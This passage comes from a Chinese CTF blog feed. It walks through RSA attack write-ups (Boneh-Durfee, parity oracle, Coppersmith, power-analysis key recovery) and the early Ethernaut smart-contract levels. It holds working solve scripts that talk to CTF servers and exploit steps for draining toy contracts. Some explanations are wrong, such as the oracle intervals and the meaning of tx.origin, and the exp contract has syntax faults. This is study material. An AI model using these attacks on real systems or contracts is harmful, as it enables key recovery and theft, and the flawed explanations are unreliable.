monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[1, jj] / monomials[jj](UU,XX,YY) PR.&lt;q&gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) if rr.is_zero() or rr.monomials() == [1]: print "the two first vectors are not independant" return 0, 0 rr = rr(q, q) soly = rr.roots() if len(soly) == 0: print "Your prediction (delta) is too small" return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] return solx, solydef boneh_durfee(n, e): delta = RR(0.167) # d ~ n^0.167 m = 5 t = round((1-2*delta) * m) X = ZZ(2*floor(n^delta)) # we have n = p^2q. so `phi(n) = n + &#123;-(pq+pr+qr) + p+q+r)&#125; - 1`. # we reconsidered boneh-durfee's attack then we have `x(A+y) + 1 = 0 mod e` where `A = (n-1)` # and (x, y) = (k, -(pq+pr+qr)+p+q+r). Y = ZZ(floor(n^(2/3))) P.&lt;x,y&gt; = PolynomialRing(ZZ) A = ZZ((n-1)/2) pol = 1 + x * (A + y) solx, soly = boneh_durfee_small_roots(pol, e, m, t, X, Y) print solx, soly if solx &gt; 0: return int(pol(solx, soly) / e) return 0if __name__ == "__main__": N = 1696852658826990842058316561963467335977986730245296081842693913454799128341723605666024757923000936875008280288574503060506225324560725525210728761064310034604441130912702077320696660565727540525259413564999213382434231194132697630244074950529107794905761549606578049632101483460345878198682237227139704889943489709170676301481918176902970896183163611197618458670928730764124354693594769219086662173889094843054787693685403229558143793832013288487194871165461567 e = 814161885590044357190593282132583612817366020133424034468187008267919006610450334193936389251944312061685926620628676079561886595567219325737685515818965422518820810326234612624290774570873983198113409686391355443155606621049101005048872030700143084978689888823664771959905075795440800042648923901406744546140059930315752131296763893979780940230041254506456283030727953969468933552050776243515721233426119581636614777596169466339421956338478341355508343072697451 print boneh_durfee(N, e) 选择密文攻击在这类攻击中我们可以传给服务器不同的密文，并且得到一些回复。通过这些回复以及已知信息可以破译明文 1.Bit Oracle Attack问题描述假设用户知道N，e，c，并且可以构造任意密文c1，返回此密文解密后p1的末尾的某些比特的性质(记为函数f)，最常见的函数f就是表示p1的奇偶性 原理攻击者得到密文$$ C = P^e mod (n)$$将其乘以$$ 2^e mod (n) $$并作为密文发送过去，并且返回f(2P) 如果f(2P)返回的最后一位是0，那么2P &lt; N，即P &lt; N/2如果f(2P)返回的最后一位是1，那么2P &gt; N，即P &gt; N/2 接下来我们来看看2P和4P 如果返回的是（偶，偶），那么有P &lt; N/4如果返回的是（偶，奇），那么有N/4 &lt; P &lt; N/2如果返回的是（奇，偶），那么有N/2 &lt; P &lt; N/4如果返回的是（奇，奇），那么有3N/4 &lt; P &lt; N可以发现规律：P的所在空间回不断的缩小，我们可以通过这种方法得到P 方法$$ C’ = (2^e mod(N))*C $$ 1234if (Oracle(C') == even) UB = (UB + LB)/2;else LB = (UB + LB)/2; 例题:XCTF 4th-QCTF-2018 babyrsa题目给了如下信息: 1234567891011e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0nc 111.198.29.45 31954 nc过去之后会有如下返回： 123456----------------------------- baby rsa -----------------------------Come and Decode your dataIf you give me ciphertext, I can tell you whether decoded data is even or oddYou can input ciphertext(hexdecimal) now1odd 也就是它可以解密我们传过去的密文并且告诉解密之后的信息是奇数还是偶数 解题脚本如下(由于我自己写的脚本一直有问题，就借鉴了别的大佬的脚本) 123456789101112131415161718192021222324252627282930313233343536373839404142434445# coding=utf-8import binasciiimport socketdef getevenOrodd(c): """nc连接获取even or odd""" adress = "111.198.29.45" port = 31954 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((adress, int(port))) s.recv(1024) data = hex(c)[:-1] + "\n" s.send(data) codeindex = s.recv(1024) s.shutdown(1) s.close() print codeindex return codeindexdef decrypt(n): count = 0 LB = 0 UB = n e = 65537 c = int("0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0",16) while LB != UB: print count c1 = (pow(2, e, n) * c) % n print UB-LB if getevenOrodd(c1)[:-1] == "even": UB = (UB + LB) / 2 else: LB = (UB + LB) / 2 c = c1 count +=1 print LBn=int("0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db",16)decrypt(n)LB = 560856645743734814774953158390773525781916094468093308691660509501812320plaintext = binascii.unhexlify(hex(LB)[2:-1])print(plaintext) Coppersmith 相关攻击参考资料 1.Factoring with High Bits Known攻击原理待补充(等我好好学学数论orz) 攻击条件当我们知道一个公钥中模数 N 的一个因子的较高位时，我们就有一定几率来分解 N。 例题:WHCTF-2017 UntitledWP参考此篇文章 题目给了服务器端代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_longimport primefacimport timefrom os import urandomimport hashlibimport sysclass Unbuffered(object): def __init__(self, stream): self.stream = stream def write(self, data): self.stream.write(data) self.stream.flush() def __getattr__(self, attr): return getattr(self.stream, attr)import syssys.stdout = Unbuffered(sys.stdout)def gen_args(): p=getPrime(1024) q=getPrime(1024) n=p*q e=0x10001 d=primefac.modinv(e,(p-1)*(q-1))%((p-1)*(q-1)) return (p,q,e,n,d)def proof(): salt=urandom(4) print salt.encode("base64"), proof=raw_input("show me your work: ") if hashlib.md5(salt+proof.decode("base64")).hexdigest().startswith("0000"): print "checked success" return 1 return 0def run(): if not proof(): return m=int(open("/home/bibi/PycharmProjects/work/whctf/flag","r").read().encode("hex"),16)#flag&#123;*&#125; (p,q,e,n,d)=gen_args() c=pow(m,e,n) print "n:",hex(n) print "e:",hex(e) print "c:",hex(c) t=int(hex(m)[2:][0:8],16) u=pow(t,e,n) print "u:",hex(u) print "====" x=int(hex(m)[2:][0:8]+raw_input("x: "),16) print "====" y=int(raw_input("y: "),16) if (pow(x,e,n)==y and pow(y,d,n)==t): print "s:",hex(int(bin(p)[2:][0:568],2))run() 第一部分是工作量证明 12345678def proof(): salt=urandom(4) print salt.encode("base64"), proof=raw_input("show me your work: ") if hashlib.md5(salt+proof.decode("base64")).hexdigest().startswith("0000"): print "checked success" return 1 return 0 写个脚本爆破就行 123456789salt=p.recvline()msg = base64.b64decode(salt)work=""for i in count(): hashid = md5(msg+str(i)).hexdigest() if hashid.startswith('0000'): #print i,hashid work=base64.b64encode(str(i)) break 然后会进入系统，主要关注以下代码 12345678910111213141516171819def run(): if not proof(): return m=int(open("/home/bibi/PycharmProjects/work/whctf/flag","r").read().encode("hex"),16)#flag&#123;*&#125; (p,q,e,n,d)=gen_args() c=pow(m,e,n) print "n:",hex(n) print "e:",hex(e) print "c:",hex(c) t=int(hex(m)[2:][0:8],16) #取hex(m)的前八位 t=1718378855 u=pow(t,e,n) print "u:",hex(u) print "====" x=int(hex(m)[2:][0:8]+raw_input("x: "),16) print "====" y=int(raw_input("y: "),16) if (pow(x,e,n)==y and pow(y,d,n)==t): print "s:",hex(int(bin(p)[2:][0:568],2))run() 我们可以输入X为空字符，Y为u，就可以得到s(官方WP说这也是他们出题失误导致可以这么做hhhh) 12345678910111213141516171819202122232425262728293031323334353637#coding=utf-8from pwn import *from itertools import countfrom hashlib import md5import base64 p=remote('118.31.18.75',20013) salt=p.recvline()msg = base64.b64decode(salt)work=""for i in count(): hashid = md5(msg+str(i)).hexdigest() if hashid.startswith('0000'): #print i,hashid work=base64.b64encode(str(i)) break#print workt=1718378855p.recvuntil('work: ')p.sendline(work)print p.recvline()print p.recvline()print p.recvline()print p.recvline()u = int(p.recvline()[5:-2],16) #uprint "u:",hex(u)print p.recvline()p.recvuntil('x: ')#print str(hex(t))p.sendline("") #xprint p.recvline()p.recvuntil('y: ') #yp.sendline(str(hex(u))[2:])# p_568=int(p.recvline()[5:-2],16)# print "p_568:",hex(p_568)print p.recvline() 之后我们得到s，是p的前568位二进制数组成的数，这里有个小坑，直接拿去高位攻击是不行的，因为必须要已知576位才能高位攻击，所以我们要爆破568到576中的八位二进制数即两位十六进制然后再进行已知高位攻击，直接放sage代码 123456789101112131415161718192021222324252627282930313233from sage.all import *import binasciin = 0x9d3a1a28ecb1bd245dd86b18dc4c5b729f23778710005118836129f08e31d6516de8ab47db1b3b7f660f50d283b1e9f2c06e7836136e4c0159f5d2b05771861d3ce6aa8715932eadc1cc0f380909a1961018340f7393142f9c177b1187151f97ac8cdc4ad17fa59a0f39d192af555f27de9cc800846eb2ca6ce78f87c0c0fbf47828328392b81771af624389fd779d130d80739bb7a608961125ba3f1800c766440fa70bfd3f834294d47d7ed9cfffd6d14ae18310f6c1d6d8f88b6c5d72a0b45608b4e21bbb8e314220ed7a2d6a8c95454e571c71b50f1d6a823778ca47131f5b889a1ed1957248bee8c4ac66872a5fd58a121560a27bad4958f1c763f2ffddL cipher = 0x1f2deea59244b14e53c72465febc2064172a35245842fa83ebff313344bed35ee8af8c3f8f61e6f498fa1fd35e63998a573d7717905f72ec01de0b0529eaab10eb0b0c2ca06e9d6e4245e748fd74f4f756a86e379559793389a3ae6c421d51bb78331a487fc3c3e68971e3e26991ab34ce2a2c07ffd5a5a1e215e766b51fb2d6aab63c2dafa3c87d0a5eb79b634740e1fca7a727de997958839bda684e19acad93cae4abfd1c8cc3684419f83696fe4840f3253e7c038adb13a1382667cf7e17ef55c1e950ea474594102e660e36a23bfd3fd830d1c18a434d0b34bed98308399a894dcab909d68bcab7c7ac990974a4f6ed7d612abb7044f6734eaaebcdc0b5L e2 = 0x10001pbits = 1024for i in range(0,127): p4=0xda5df16f286dbc825cd0c8ee48aa26ac27338a75172c5b92351f14d083216f7e91b9355e27cf930646fbbda6058dec3c4ddf751f36df5556359fbe671f9b947b4c79cadfdbb27b00 p4=p4+int(hex(i),16) print hex(p4) kbits = pbits - p4.nbits() #未知需要爆破的比特位数 print p4.nbits() p4 = p4 &lt;&lt; kbits PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits, beta=0.4) # find root &lt; 2^kbits with factor &gt;= n^0.4 #rint roots if roots: #爆破成功，求根 p = p4+int(roots[0]) print "p: ", hex(int(p)) assert n % p == 0 q = n/int(p) print "q: ", hex(int(q)) print gcd(p,q) phin = (p-1)*(q-1) print gcd(e2,phin) d = inverse_mod(e2,phin) flag = pow(cipher,d,n) flag = hex(int(flag))[2:-1] print binascii.unhexlify(flag) 侧信道攻击参考资料 能量分析攻击（侧信道攻击）是一种能够从密码设备中获取秘密信息的密码攻击方法．与其 他攻击方法不同：这种攻击利用的是密码设备的能量消耗特征，而非密码算法的数学特性．能量分析攻击是一种非入侵式攻击，攻击者可以方便地购买实施攻击所需要的设备：所以这种攻击对智能卡之类的密码设备的安全性造成了严重威胁。 能量分析攻击是安全领域内非常重要的一个部分，我们只在这里简单讨论下。 能量分析攻击分为： - 简单能量分析攻击（SPA），即对能量迹进行直观分析，肉眼看即可。 - 差分能量分析攻击（DPA），基于能量迹之间的相关系数进行分析。 攻击条件攻击者可获取与加解密相关的侧信道信息，例如能量消耗、运算时间、电磁辐射等等 例题:HITB-2017 Hack in the card I题目给出了公钥文件 publickey.pem，密文，测量智能卡功率的电路图，和解密过程中智能卡消耗的功率变化（通过在线网站给出 trace）。 3 4 密文为 1014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046 由于网站只给出了一条能量迹，所以可以断定这是 Simple channel analysis（SPA）攻击。那么我们可以直接通过观察能量迹的高低电平来获得 RSA 解密过程的密钥 d。 RSA 可被 SPA 攻击的理论基础来自于 RSA 中包含的快速幂取余算法。 快速幂算法如下1.b为偶数时:$$ a^b mod(c) = (a^{2^{b/2}} )mod(c) $$ 2.b为奇数时：$$ a^b mod(c) = (a^{2^{b/2}} \times a) mod(c) $$ 相应的C代码实现为: 123456789101112int PowerMod(int a, int b, int c)&#123; int ans = 1; a = a % c; while(b&gt;0) &#123; if(b % 2 == 1) // 当b为奇数时会多执行下面的指令 ans = (ans * a) % c; b = b/2; a = (a * a) % c; &#125; return ans;&#125; 由于快速幂的计算过程中会逐位判断指数的取值，并会采取不同的操作，所以可从能量迹中还原出 d 的取值（从上面可知，直接得到的值是 d 的二进制取值的逆序） 注意： 有时候模乘也可能会从高位向低位进行模乘。这里是从低位向高位模乘。 那么根据上面的说法，我们可以看出来能量迹高位的时候的长度不同，长的对应1，短的对应2，也就是如下图所示： 5 我们可以通过这个信息还原d。 在给的能量迹的html中我们可以找到data数组，对应着能量迹的每一个点。其中前面的能量迹的点有波动可以不管，我们从稳定的位置开始分析即可，也就是data[200]之后 6 我们可以统计每一个高电平的点的数量.经过统计我们可以得到：100个点对应1，50个点对应0，则解题脚本如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import gmpy2f = open('./data.txt')data = f.read().split(",")#print('point number:', len(data))start_point = 205lflag = 0rflag = 0flag = 0res = ''for point_index in range(start_point, len(data)): if float(data[point_index]) &gt; 225 and flag == 0: lflag = point_index flag = 1 continue if float(data[point_index]) &lt; 225 and flag == 1: rflag = point_index flag = 0 r = rflag - lflag if r &gt; 75: res += '1' else: res += '0' continueout = ''for i in range(len(res)): data = res[len(res)-i-1] out += data#print(out)d = int(out,2)print(d)n = 0x17AE4F9BD4FF06B94C46DCBB7070070C7C23C4E8728BE3173CA815FCA5471C0BB35B19ED8838530ABB27D69B1C9D87229D0658D807D8EF74D732576DF4FBA9CD611FC768BE6047C52E8168A1C77E0E54D4877DC20A73FC3A2DB35DDE8700E79BAF61676BF6B6B27032E6B9F3A02F3FAAAFF36251BF2935D9CB45EFAC13D0974484C3D53C2A66A3D279D2B1B594F3797C0B8D33409161F7293EECB5287F45DA104020F0215BCC824338AD4A316E25E4A167A6E4928AF122FA0A55C4E55DEE01A4E0EED89F4B290BF79B5CAFE797AE4FA4B369E043AA0DFE91487E9054FF843EA249ED7945C8A911796F81A0F82EB5694A2FE2EBFF13A9E6DF3334FCAA1C63CBAC3'''e = '01:58:3f:58:ca:92:30:c4:f8:84:4c:7f:33:d6:19:83:c2:7b:f6:11:94:7a:1d:ce:39:00:73:03:88:05:17:5b:18:f2:45:54:3b:61:c6:ea:ab:46:a5:72:d0:34:26:47:6e:9a:ec:c3:47:16:cd:ac:9e:33:f0:31:f5:38:1d:18:cf:21:2a:81:91:f8:26:dd:10:e0:4f:db:50:6b:a9:fd:91:e4:83:1d:8a:dc:4c:75:aa:2a:a6:13:2e:7e:48:ea:c6:6d:7e:cf:24:42:82:95:eb:1b:7c:64:48:0c:f1:70:be:83:bc:d8:53:f9:77:9e:6d:f5:99:9c:2b:ee:f8:38:d2:f0:c4:d8:fc:4d:9c:8e:4c:6c:37:25:94:46:68:9e:c3:06:34:bc:d6:8f:29:3c:58:cd:44:03:9b:e6:29:9f:92:64:96:20:d6:e6:01:7d:fd:60:07:d1:bd:01:2d:f7:ca:be:c4:59:e0:e9:83:f1:7b:50:51:af:4a:4f:ca:5c:c7:1c:dd:72:a6:f4:80:8e:73:f8:33:91:7c:2f:54:80:1b:d9:a0:6e:35:99:ed:b9:a6:29:36:76:4c:e0:84:db:f5:55:c1:6f:9e:47:81:ea:d6:fd:39:79:24:76:c6:df:c0:dd:05:ad:a2:81:f7:51:11:ef:d7:52:80:65:d9:e3:5b'e = e.split(':')eout = ''for i in e: eout +=iprint(eout)'''e = 0x01583f58ca9230c4f8844c7f33d61983c27bf611947a1dce390073038805175b18f245543b61c6eaab46a572d03426476e9aecc34716cdac9e33f031f5381d18cf212a8191f826dd10e04fdb506ba9fd91e4831d8adc4c75aa2aa6132e7e48eac66d7ecf24428295eb1b7c64480cf170be83bcd853f9779e6df5999c2beef838d2f0c4d8fc4d9c8e4c6c37259446689ec30634bcd68f293c58cd44039be6299f92649620d6e6017dfd6007d1bd012df7cabec459e0e983f17b5051af4a4fca5cc71cdd72a6f4808e73f833917c2f54801bd9a06e3599edb9a62936764ce084dbf555c16f9e4781ead6fd39792476c6dfc0dd05ada281f75111efd7528065d9e35bm = 0X014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046 t = pow(m,d,n)#t = '484954427b4d79206e616d6520697320416c6963652c20616e642074686973206973206d792073746f72792c2074686520656e64206f66206d792073746f72797d'print hex(t)[2:-1].decode('hex')]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut训练]]></title>
    <url>%2F2019%2F01%2F08%2Fethernautd%E8%AE%AD%E7%BB%83%2F</url>
    <content type="text"><![CDATA[简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接 level 0 - Hello Ethernaut题目链接 第一步首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络 MetaMask和Ropsten测试网络 第二步打开控制台，然后会发现给了合约地址和help 合约地址 help 其中level地址为 `0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c` 在Ropsten测试网络下还会有你的player地址和Ethernaut地址使用player指令可以直接获得player地址 player地址和Ethernaut地址 第三步之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7 调用getBalance 第四步使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的公共方法列表，当然在下面可以看见例如owner: f()之类的东西就是方法的具体信息 查看合约信息 第五步与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用ethernaut.owner()，返回的是智能合约的拥有者 调用owner 第六步这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至中文，然后点击存入-测试水管，之后点击request 1 ether from faucet就行 第七步生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间 获取实例按钮 成功之后会显示下图 成功 第八步题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用contract.方法就行 第九步从contract.info()入手跟着走下去就行 10 11 12 之后点击submit instance即可过关。 通关后的彩蛋 Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.You are now ready to complete all the levels of the game, and as of now, you’re on your own.Godspeed!! level 1 - Fallback题目链接 胜利条件1.获得合约的所有权2.收回合约的所有余额 tips1.如何用ABI发送ether2.如何用ABI以外的方法发送ether3.查看help()会有帮助4.Fallback方法 源码123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallback is Ownable &#123; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; //构造函数，初始化owner的contributions为1000 contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; //将合约拥有权交给贡献1000ETH以上的人 require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; //查询contribution return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; //owner收回合约的所有余额，只有owner可以调用 owner.transfer(this.balance); &#125; function() payable public &#123; //fallback函数，当满足发送的value大于1并且发送者的contributions的值大于1时将owner变为消息发送者 require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 预备知识回退函数(fallback function)1.每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。 2.此外，当合约收到ether时（没有任何其它数据），这个函数也会被执行。向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。 我们在这里要用到的就是第二点 解题思路最终目的是调用withdraw()方法将余额清零，也就是我们要成为ownercontribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）在fallback中只要满足msg.value&gt;0且contributions[msg.sender]&gt;0即可成为owner其中msg.value我们可以直接发送过去，而contributions[msg.sender]我们需要调用contribute()这个函数，也就是参数满足value&lt;0.001的条件就行 具体步骤1.调用contribute函数，传入参数value=1其中value的单位是wei 11 eth = 1e9 Gwei = 1e18 wei 15 2.调用send函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用contract.sendTransaction({value: 100}))， 由于send函数会调用fallback函数，我们便成为了owner 16 3.调用withdraw函数，将钱卷走 17 4.点击submit instance即可过关。 注意事项绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号(:зゝ∠) 通关后的彩蛋 You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.Move on to the next level when you’re ready! level 2 - Fallout题目链接 胜利条件1.获得合约的所有权 tips1.Solidity Remix IDE 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallout is Ownable &#123; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] += msg.value; &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 解题思路可以看出函数的构造函数写错了，Fallout写成了Fal1out，变为了谁都可以调用的函数(我们无法调用构造函数)。所以我们可以调用构造函数成为owner，然后再调用collectAllocations取钱 具体步骤1.调用Fal1out函数，成为owner 19 2.调用collectAllocations函数，将钱卷走 20 3.点击submit instance即可过关。 通关后的彩蛋 That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?Well… Not quite.The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract: 12345&gt; contract Rubixi &#123;&gt; address private owner;&gt; function DynamicPyramid() &#123; owner = msg.sender; &#125;&gt; function collectAllFees() &#123; owner.transfer(this.balance) &#125;&gt; ... This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland. level 3 - Coin Flip题目链接 胜利条件1.猜抛硬币的结果，连续猜对十次即可获胜 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; 预备知识1.revert()这行代码：if(msg.sender != owner) { throw; }完全等价于如下三种形式：if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner); 解题思路1.从随机数逻辑生成来看，主要有三个步骤&nbsp;&nbsp;&nbsp;&nbsp;a.获取上一个块的hash&nbsp;&nbsp;&nbsp;&nbsp;b.判断hash是否和上一次的hash相同，相同则回退&nbsp;&nbsp;&nbsp;&nbsp;c.根据blockValue/FACTOR的结果判断硬币正负 2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可 具体步骤1.编写exp合约 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract exp&#123; CoinFlip C; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 function setCoinflip(address _addr) public &#123; C = CoinFlip(_addr); &#125; function hack() public OwnerOnly &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; C.flip(side); &#125;&#125; 2.部署在remix上并运行hack方法十次 22 3.通过命令contract.consecutiveWins()可查询猜对的次数 23 4.当猜对的次数为10次以上之后，点击submit instance即可过关。 通关后的彩蛋 Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor. Some options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize). level 4- Telephone题目链接 胜利条件1.获得合约的所有权 tips1.See the Help page above, section &quot;Beyond the console&quot;,这一节主要就是教你可以使用Remix和Truffle进行合约编写和attack，也就是我们所说的写exp并运行。 源码12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 预备知识1.tx.origin 全局变量，也就是合约的owner 解题思路1.我们可以编写代码调用changeOwner，传入我们的地址，就可以变成合约owner了 具体步骤1.编写exp合约 123456789101112131415161718192021222324252627pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; 